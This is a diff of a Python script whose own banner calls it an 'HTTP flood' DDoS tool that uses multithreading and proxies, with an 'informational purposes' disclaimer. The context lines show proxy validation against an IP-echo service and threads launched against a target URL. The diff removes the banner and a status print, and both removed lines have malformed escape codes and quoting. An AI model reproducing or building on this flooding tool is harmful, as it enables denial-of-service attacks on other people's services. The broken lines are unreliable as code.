@@ -36,8 +36,6 @@ def authenticate():
         print("\033[1;31mIncorrect password. Exiting...\033[0m")
         exit()
 
-033[1;34m\n\n[ Dev: ASCII . by ZanAhmad ]\n[ The program uses a simple type of DDoS attack\n  \"HTTP flood\" using multithreading and a proxies ]\n[ The program was created for informational purposes !!! ]\n\n"033[0m\n"+Style.RESET_ALL)
-
 def check_prox(array, url):
 	ip = r.post("http://ip.beget.ru/").text
 	for prox in array:
@@ -52,7 +50,6 @@ def check(ip, prox, url):
 	except:
 		ipx = ip
 	if ip != ipx:
-		print(033[1;32m.133[0m"{} good! Starting...".format(prox)+Style.RESET_ALL)
 		thread_list = []
 		t = threading.Thread (target=ddos, args=(prox, url))
 		thread_list.append(t)
